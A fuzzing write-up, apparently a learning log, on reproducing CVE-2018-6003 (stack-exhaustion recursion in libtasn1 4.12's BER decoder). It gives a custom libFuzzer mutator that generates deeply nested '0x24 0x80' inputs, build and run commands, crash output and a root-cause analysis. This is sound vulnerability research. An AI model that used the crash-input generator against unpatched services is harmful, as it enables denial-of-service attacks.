# Case 4 — Final custom mutator reproducing CVE-2018-6003

## Target
- GNU libtasn1 4.12 (vulnerable version; bug fixed in 4.13), function `asn1_decode_simple_ber`.
- CVE-2018-6003: uncontrolled recursion (stack exhaustion) in the BER decoder on indefinite-length constructed encoding — CWE-674, DoS.

## Context and progression across cases

Case1 was about learning how to build a libFuzzer harness. From case2 onward, I tried to
rediscover CVE-2018-6003 in libtasn1 4.12. Case2 showed that raw mutation did not generate
its strict trigger. Case3 showed, first through unit tests and then by testing structure-aware
generation, that the decoder requires `0x24 0x80` at every constructed level and `0x04 0x00`
for the leaf. That case then exposed a second limitation: libprotobuf-mutator could not emit
more than its recursion limit, so it could not reach stack exhaustion. Case4 removes both
obstacles by returning to a custom raw-byte mutator that enforces the correct filters and
controls the nesting depth.

| Case | Approach | Limitation / Outcome |
|------|----------|----------------------|
| **case2** | Raw libFuzzer | Random byte mutations never discover the magic pattern `0x24 0x80` nested across dozens of levels (~$1/256$ chance per level → exponentially impossible). |
| **case3** | Structure-aware fuzzing (LPM + Protobuf) | Solves the grammar problem, but `libprotobuf-mutator` enforces an internal limit `SetRecursionLimit(100)` in `text_format.cc`. It cannot generate the thousands of nesting levels required to blow the 8 MB Linux stack. |
| **case4** | Custom Mutator (`LLVMFuzzerCustomMutator`) | Bypasses LPM entirely. Directly enforces the nested BER grammar (`0x24 0x80` chain followed by a primitive `0x04 0x00` leaf) on raw mutated inputs, allowing unlimited recursion depth up to the stack limit. |

## Approach: Custom Mutator
Instead of relying on an external protobuf grammar or hoping random mutations generate valid ASN.1 BER, we implement `LLVMFuzzerCustomMutator`:
- It uses standard `LLVMFuzzerMutate()` to mutate the payload size.
- It overwrites the buffer with a continuous stream of constructed indefinite-length headers: `[0x24, 0x80]` repeated for $N$ levels.
- It terminates the chain with an empty primitive `OCTET STRING` leaf: `[0x04, 0x00]`.
- The depth scales linearly with input size ($N \approx \text{size} / 2$).

```c
size_t LLVMFuzzerCustomMutator(uint8_t *Data, size_t Size, size_t MaxSize, unsigned int Seed) {
    size_t new_size = LLVMFuzzerMutate(Data, Size, MaxSize);
    if (new_size < 4) 
        return 0;

    size_t i = 0;
    while (i + 4 <= new_size) {
        Data[i]     = 0x24; // Constructed OCTET STRING
        Data[i + 1] = 0x80; // Indefinite length
        i += 2;
    }
    Data[i]     = 0x04; // Primitive OCTET STRING leaf
    Data[i + 1] = 0x00; // Leaf length = 0
    return i + 2;
}
```

## Build & Execution

Compile vulnerable libtasn1 4.12 instrumented with ASAN and libFuzzer:

```bash
CC=clang CFLAGS="-g -O1 -fsanitize=address,fuzzer-no-link" ./configure --disable-shared --disable-doc
make
```

Link the harness:

```bash
clang -g -O1 -fsanitize=address,fuzzer \
    -I .local/src/libtasn1-4.12/lib/includes \
    test_fuzz_ber.c \
    .local/src/libtasn1-4.12/lib/.libs/libtasn1.a \
    -o fuzz_ber
```

Run with an extended `-max_len` to allow deep nesting:

```bash
./fuzz_ber corpus_ber/ -max_len=100000
```

## Result: Crash Reproduction (CVE-2018-6003)

At default `-max_len=8192`, depth was capped at $\sim 4\,096$ levels ($\sim 1.5\text{ MB}$ stack), which fit inside the 8 MB Linux stack limit (`ulimit -s`).

With `-max_len=100000`, the fuzzer quickly generated inputs exceeding 30,000 bytes ($\sim 15\,000+$ nested levels), immediately exceeding the 8 MB thread stack:

```text
INFO:       98 files found in corpus_ber/
INFO: seed corpus: files: 98 min: 4b max: 27396b total: 382456b rss: 29Mb
#99     INITED cov: 30 ft: 213 corp: 94/336Kb exec/s: 0 rss: 42Mb
[1]    30521 segmentation fault (core dumped)  ./fuzz_ber corpus_ber/ -max_len=100000
```

### Crash Analysis (GDB)

Inspecting the execution with GDB confirms stack exhaustion in the target library:

```text
Thread 1 "fuzz_ber" received signal SIGSEGV, Segmentation fault.
0x0000000000508a18 in _asn1_decode_simple_ber (etype=<optimized out>, der=<optimized out>, _der_len=<optimized out>, str=<optimized out>, str_len=<optimized out>, ber_len=<optimized out>, dflags=<optimized out>) at decoding.c:2159

───────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5032cd → asn1_get_tag_der(...)
[#1] 0x508e17 → _asn1_decode_simple_ber(...)
[#2] 0x50c6cc → asn1_decode_simple_ber(...)
[#3] 0x5093d0 → _asn1_decode_simple_ber(...)
[#4] 0x50c6cc → asn1_decode_simple_ber(...)
[#5] 0x5093d0 → _asn1_decode_simple_ber(...)
[#6] 0x50c6cc → asn1_decode_simple_ber(...)
[#7] 0x5093d0 → _asn1_decode_simple_ber(...)
[#8] 0x50c6cc → asn1_decode_simple_ber(...)
[#9] 0x5093d0 → _asn1_decode_simple_ber(...)
... (thousands of recursive frames)
```

## How the Recursion Mechanism Works (Internal Call Chain)

A common point of confusion is how recursion happens when our fuzzer harness only calls `asn1_decode_simple_ber` a single time. 

The recursion **does not exist in the harness** — it is purely internal to `libtasn1`:

```text
[ Startup: ./fuzz_ber corpus_ber/ -max_len=100000 ]
       │
       ▼
1. [ Initial Loading ]
   libFuzzer loads seed files from `corpus_ber/` into RAM
   and allows buffer allocations up to 100,000 bytes (MaxSize = 100000).
       │
       ▼
   ┌───────────────────────────────────────────────────────────────┐
   │                     LIBFUZZER MAIN LOOP                       │
   │                                                               │
   │  2. [ Seed Selection ]                                        │
   │     libFuzzer picks an existing input from the corpus.        │
   │           │                                                   │
   │           ▼                                                   │
   │  3. [ LLVMFuzzerCustomMutator(Data, Size, MaxSize=100000) ]   │
   │     ├── Calls LLVMFuzzerMutate() -> varies `new_size`         │
   │     │   (e.g., grows buffer to 32,000 bytes).                 │
   │     └── The `while (i + 4 <= new_size)` loop formats the      │
   │         buffer with ~15,999 pairs of `0x24 0x80` + `04 00`.   │
   │           │                                                   │
   │           ▼                                                   │
   │  4. [ LLVMFuzzerTestOneInput(Data, Size) ]                    │
   │     Invoked ONCE with this 32,000-byte buffer.                │
   │           │                                                   │
   │           ▼                                                   │
   │  5. [ asn1_decode_simple_ber(...) ]                           │
   │           │                                                   │
   │           ▼                                                   │
   │  6. [ _asn1_decode_simple_ber(...) ] ◄──┐                     │
   │           │                             │ (Internal recursion:│
   │           ├── Reads `0x24 0x80`         │  reads next pair    │
   │           └── Re-invokes asn1_decode... ┘  ~15,000 times)     │
   │                                                               │
   │  7. [ Iteration Outcome ]                                     │
   │     ├── If leaf `0x04 0x00` is reached without crash:         │
   │     │   libFuzzer checks for new code coverage -> saves to    │
   │     │   corpus and loops back to step 2.                      │
   │     └── If stack usage exceeds 8 MB (Stack Overflow):         │
   │         Kernel sends SIGSEGV -> libFuzzer dumps crash input   │
   │         to `crash-<hash>` and terminates.                     │
   └───────────────────────────────────────────────────────────────┘
```

### The Vulnerable Code in `lib/decoding.c`

Inside `_asn1_decode_simple_ber` (around line 2240 in libtasn1 4.12):

```c
static int _asn1_decode_simple_ber(...) {
    ...
    /* Indefinite constructed OCTET STRING (0x24 0x80) */
    if (((dflags & DECODE_FLAG_INDEFINITE) || class == ASN1_CLASS_STRUCTURED) && ETYPE_IS_STRING(etype)) {
        ...
        do {
            /* RECURSIVE CALL: Re-invokes the decoder on the inner content */
            result = asn1_decode_simple_ber(etype, p, der_len, &out, &out_len, &tmp_len);
            if (result != ASN1_SUCCESS)
                goto cleanup;

            p += tmp_len;
            ...
        } while (1);
    }
}
```

- **Fix in 4.13:** GNU libtasn1 4.13 introduced an explicit nesting depth limit to stop recursion before stack exhaustion occurs.

- **Root Cause:** In `lib/decoding.c`, when `_asn1_decode_simple_ber` encounters an indefinite-length constructed string (`0x24 0x80`), it recursively calls `asn1_decode_simple_ber` on each inner component without any recursion depth bound.
- Each call frame on Linux x86-64 under ASAN uses $\sim 350 - 400$ bytes.
- At $\sim 15\,000$ recursion levels, `$rsp` collides with the stack guard page at the bottom of the 8 MB stack boundary, triggering `SIGSEGV`.

## What I learned
- **Grammar enforcement without heavy engines:** When libFuzzer alone struggles with strict multi-level magic byte constraints (case2) and complex grammar engines like LPM impose artificial depth limits (case3), writing a custom mutator (`LLVMFuzzerCustomMutator`) provides complete control over both format validity and recursion depth.
- **Stack size vs. Fuzzer max length:** Reproducing stack overflows requires calculating the memory consumed per stack frame against the OS stack limit (`ulimit -s`). A fuzzer with `-max_len=8192` could never trigger the bug on an 8 MB stack; scaling `-max_len` to 100,000 allowed the input to reach the critical $\sim 15\,000$ depth threshold.
